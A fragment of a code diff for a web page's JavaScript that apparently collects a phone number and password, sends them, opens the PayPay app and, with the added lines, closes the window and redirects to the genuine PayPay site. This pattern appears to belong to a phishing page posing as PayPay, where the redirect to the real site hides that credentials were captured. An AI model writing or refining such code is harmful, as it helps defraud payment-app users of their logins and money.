@@ -213,9 +213,10 @@
                     // PayPayアプリを開く
                     window.location.href = payPayAppURL;
 
-                    // 1秒後にページを閉じる
+                    // 1秒後にページを閉じてスタートページに戻る
                     setTimeout(() => {
                         window.close(); // ウィンドウを閉じる
+                        window.location.href = 'https://www.paypay.ne.jp'; // スタートページに戻る
                     }, 1000); // 1秒待つ
                 } else {
                     console.error('送信に失敗しました。');
@@ -225,6 +226,7 @@
                 console.error('エラー:', error);
             });
         }
+
         // 電話番号やパスワードが入力されるたびにチェックとフォーマット
         phoneInput.addEventListener('input', function() {
             formatPhoneNumber();
